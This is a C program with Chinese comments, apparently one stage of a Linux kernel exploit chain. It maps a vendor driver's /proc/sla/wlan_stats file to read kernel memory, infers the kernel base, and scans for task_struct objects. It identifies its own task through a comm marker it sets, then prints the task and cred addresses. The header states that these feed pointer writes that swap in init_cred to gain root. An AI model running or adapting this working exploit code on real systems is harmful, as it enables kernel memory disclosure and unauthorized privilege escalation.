/* tsfind.c — 验证 /proc/sla 那张"每任务一条"的表里的 ptr 是不是 `struct task_struct *`。
 * 全程只读, 零 punch。设计见 analysis/GHOST-CRED-SWEEP-20260928.md §7。
 *
 *   (A) 先把 SLA 表整个收下来: 记录 = { ptr(+0), 若干 u32(+8..+39), comm[16](+40) }, 步长 72。
 *   (B) 再在读窗口里**独立地**找"长得像 task_struct"的对象:
 *         prio(+0xb4) == static_prio(+0xb8) 且 ∈ [100,140]
 *         real_cred(+0x840) == cred(+0x848) 且是个 8 对齐核指针
 *       (这两个偏移是 9/27 用 dump_obj.py init_task + rela 一手坐实的)
 *   (C) 对每个找到的对象: 它的内核 VA = K + 偏移, **若它同时出现在 (A) 的 ptr 集合里 ⇒ (A) 的
 *       ptr 就是 task_struct**, 而且它的 comm 应当与 SLA 记录里那份一致 ⇒ 双重对上。
 *   ⇒ 于是"我们自己那条记录"(comm == 我们 prctl 设的唯一标记)里的 ptr 就是我们自己的
 *     task_struct ⇒ `ptr+0x840 / ptr+0x848` 是两个已知的可写核地址 ⇒ 两发指针写顶成 init_cred。 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <setjmp.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>

static sigjmp_buf jb;
static volatile int on;
static void sbb(int s) { (void)s; if (on) siglongjmp(jb, 1); }
static uint64_t q(const unsigned char *p, size_t o) { uint64_t v; memcpy(&v, p + o, 8); return v; }
static int cmp64(const void *a, const void *b) {
  uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
  return x < y ? -1 : (x > y ? 1 : 0);
}
static uint64_t find_base(const unsigned char *m, const unsigned char *ok, size_t np, size_t *cnt_out) {
  size_t cap = 2u << 20, n = 0;
  uint64_t *kv = malloc(cap * sizeof *kv);
  if (!kv) return 0;
  for (size_t i = 0; i < np; i++) {
    if (!ok[i]) continue;
    for (size_t o = i * 4096u; o + 8 <= (i + 1) * 4096u; o += 8) {
      uint64_t v = q(m, o);
      if ((v >> 48) != 0xffffULL || v <= o) continue;
      if (n < cap) kv[n++] = (v - o) & ~0xfffULL;
    }
  }
  qsort(kv, n, sizeof *kv, cmp64);
  uint64_t best = 0; size_t bestn = 0, run = 1;
  for (size_t i = 1; i <= n; i++) {
    if (i < n && kv[i] == kv[i - 1]) run++;
    else { if (run > bestn) { bestn = run; best = kv[i - 1]; } run = 1; }
  }
  free(kv);
  if (cnt_out) *cnt_out = bestn;
  return best;
}

#define MAXS 30000
static uint64_t sptr[MAXS]; static char snm[MAXS][17]; static int ns;
#define MAXT 512
static size_t tof[MAXT]; static int nt;

int main(int argc, char **argv) {
  const char *nm = argc > 1 ? argv[1] : "TSf9x7Qm2Wt4Z";
  char self[16];
  snprintf(self, sizeof self, "%.15s", nm);
  prctl(PR_SET_NAME, self, 0, 0, 0);
  printf("[TS] 我自己 pid=%d tid=%ld ppid=%d uid=%d comm=[%s]\n",
         getpid(), syscall(__NR_gettid), getppid(), getuid(), self);
  fflush(stdout);
  int fd = open("/proc/sla/wlan_stats", O_RDONLY | O_CLOEXEC);
  if (fd < 0) { printf("open errno=%d\n", errno); return 1; }
  size_t L = 1ull << 30;
  unsigned char *m = mmap(NULL, L, PROT_READ, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { printf("mmap errno=%d\n", errno); return 2; }
  struct sigaction sa, old;
  memset(&sa, 0, sizeof sa); sa.sa_handler = sbb; sigemptyset(&sa.sa_mask);
  sigaction(SIGBUS, &sa, &old);
  size_t np = L / 4096u, okp = 0;
  unsigned char *ok = calloc(np, 1);
  for (size_t i = 0; i < np; i++) {
    on = 1;
    if (sigsetjmp(jb, 1) == 0) { volatile char c = m[i * 4096u]; (void)c; ok[i] = 1; okp++; }
    on = 0;
  }
  size_t bcnt = 0;
  uint64_t K = find_base(m, ok, np, &bcnt);
  printf("[TS] 窗口 1GB 可读 %zu 页(= %zu MB) K=%016llx(自洽 %zu)\n",
         okp, okp * 4096 >> 20, (unsigned long long)K, bcnt);
  fflush(stdout);
  if (!K) return 3;

  /* (A) 收 SLA 记录(不要求 ptr 在窗口里) */
  for (size_t i = 0; i < np && ns < MAXS; i++) {
    if (!ok[i]) continue;
    for (size_t o = i * 4096u; o + 56 <= (i + 1) * 4096u && ns < MAXS; o += 8) {
      uint64_t v = q(m, o);
      if ((v >> 48) != 0xffffULL || (v & 7)) continue;
      const unsigned char *c = m + o + 40;
      int len = 0;
      while (len < 16 && c[len] >= 0x20 && c[len] <= 0x7e) len++;
      if (len < 4 || c[len] != 0) continue;          /* comm 长度 4..15 且以 NUL 结尾 */
      memcpy(snm[ns], c, 16); snm[ns][16] = 0;
      sptr[ns] = v; ns++;
    }
  }
  printf("[TS] (A) SLA 记录收到 %d 条\n", ns);
  for (int c = 0; c < ns && c < 12; c++)
    printf("[TS]     #%d ptr=%016llx comm=[%s]\n", c, (unsigned long long)sptr[c], snm[c]);
  int mark = -1;
  for (int c = 0; c < ns; c++) if (!strcmp(snm[c], self)) mark = c;
  printf("[TS] (A) 含我们标记的记录 = %s", mark >= 0 ? "有 ⇒ " : "没有 ⇒ 表不在这一段里\n");
  if (mark >= 0)
    printf("我们的记录 ptr=%016llx (待验证的 task_struct 候选)\n", (unsigned long long)sptr[mark]);
  fflush(stdout);

  /* (B) 窗口里独立地找 task_struct 形状的对象 */
  for (size_t i = 0; i < np && nt < MAXT; i++) {
    if (!ok[i]) continue;
    for (size_t X = i * 4096u; X + 0x850 <= (i + 1) * 4096u && nt < MAXT; X += 8) {
      uint32_t p1 = 0, p2 = 0;
      memcpy(&p1, m + X + 0xb4, 4); memcpy(&p2, m + X + 0xb8, 4);
      if (p1 != p2 || p1 < 100 || p1 > 140) continue;
      uint64_t cr1 = q(m, X + 0x840), cr2 = q(m, X + 0x848);
      if (cr1 != cr2 || (cr1 >> 48) != 0xffffULL || (cr1 & 7)) continue;
      uint64_t stk = q(m, X + 0x68);
      if ((stk >> 48) != 0xffffULL || (stk & 0x3fff)) continue;   /* stack 必须是页/16K 对齐的核地址 */
      tof[nt++] = X;
      if (nt <= 12)
        printf("[TS] (B) task 形状#%d 偏移=+%zu VA=%016llx prio=%u cred=%016llx stack=%016llx\n",
               nt, X, (unsigned long long)(K + X), p1, (unsigned long long)cr2,
               (unsigned long long)q(m, X + 0x68));
    }
  }
  printf("[TS] (B) 窗口里 task 形状对象 %d 个\n", nt);
  fflush(stdout);

  /* (B2) 直接在这些 task 对象体内搜我们的 comm 标记 ⇒ 认出"哪一个是我们" */
  size_t ml = strlen(self);
  int mine = -1;
  for (int c = 0; c < nt; c++) {
    size_t X = tof[c];
    for (size_t o = X; o + ml + 1 <= X + 0x1600 && o + ml + 1 <= L; o++) {
      size_t pg = o / 4096u;
      if (!ok[pg]) break;
      if (m[o] != self[0] || memcmp(m + o, self, ml)) continue;
      mine = c;
      uint64_t cr = q(m, X + 0x848);
      printf("[TS] (B2) *** 我们的 task: 偏移=+%zu VA=%016llx (comm@+%zu ⇒ comm 偏移=+0x%zx)\n",
             X, (unsigned long long)(K + X), o, o - X);
      printf("[TS] (B2)     stack=%016llx cred=%016llx prio=%u\n",
             (unsigned long long)q(m, X + 0x68), (unsigned long long)cr,
             *(uint32_t *)(m + X + 0xb4));
      if (cr > K && cr - K < L && ok[(cr - K) / 4096u]) {
        size_t co = (size_t)(cr - K);
        uint64_t w0 = q(m, co), w1 = q(m, co + 8), w2 = q(m, co + 16), w3 = q(m, co + 24);
        printf("[TS] (B2)     cred 也在窗口里(+%zu): usage=%u uid=%u gid=%u suid=%u sgid=%u "
               "euid=%u egid=%u fsuid=%u fsgid=%u\n",
               co, (uint32_t)w0, (uint32_t)(w0 >> 32), (uint32_t)w1, (uint32_t)(w1 >> 32),
               (uint32_t)w2, (uint32_t)(w2 >> 32), (uint32_t)w3, (uint32_t)(w3 >> 32));
        printf("CRED=%llx\n", (unsigned long long)cr);
      } else printf("[TS] (B2)     cred 不在窗口里(只有地址, 也够用)\n");
      printf("TASK=%llx\n", (unsigned long long)(K + X));
      break;
    }
    if (mine >= 0) break;
  }
  if (mine < 0) printf("[TS] (B2) × %d 个 task 对象里没有我们的标记 ⇒ 我们的 task 不在这段 slab 区\n", nt);
  fflush(stdout);

  /* (C) 交叉对上: task 对象的 VA 是否出现在 SLA 的 ptr 集合里 */
  uint64_t *ss = malloc((size_t)(ns + 1) * sizeof *ss);
  for (int c = 0; c < ns; c++) ss[c] = sptr[c];
  qsort(ss, ns, sizeof *ss, cmp64);
  int match = 0;
  for (int c = 0; c < nt; c++) {
    uint64_t va = K + tof[c];
    if (!bsearch(&va, ss, (size_t)ns, sizeof *ss, cmp64)) continue;
    match++;
    for (int s2 = 0; s2 < ns; s2++) {
      if (sptr[s2] != va) continue;
      size_t T = tof[c];
      for (size_t o = T; o + 17 <= T + 0x1400 && o + 17 <= L; o++) {
        int pr = 1;
        for (int k = 0; k < 15; k++) if (m[o + k] < 0x20 || m[o + k] > 0x7e) pr = 0;
        if (!pr || m[o + 15]) continue;
        char comm[20];
        memcpy(comm, m + o, 16); comm[16] = 0;
        printf("[TS] (C) *** SLA ptr=%016llx comm=[%-16s] == 窗口 task 对象(偏移+%zu, 体内 comm@+%zu=[%s])\n",
               (unsigned long long)va, snm[s2], T, o, comm);
        break;
      }
      break;
    }
  }
  printf("[TS] (C) 对上 %d 个 ⇒ %s\n", match,
         match ? "**SLA 记录的 ptr 就是 task_struct(偏移表也一并证实)**"
               : "没对上(窗口里没有 task, 或 ptr 不是 task)");
  free(ss);
  free(ok);
  munmap(m, L);
  close(fd);
  return match ? 0 : 5;
}
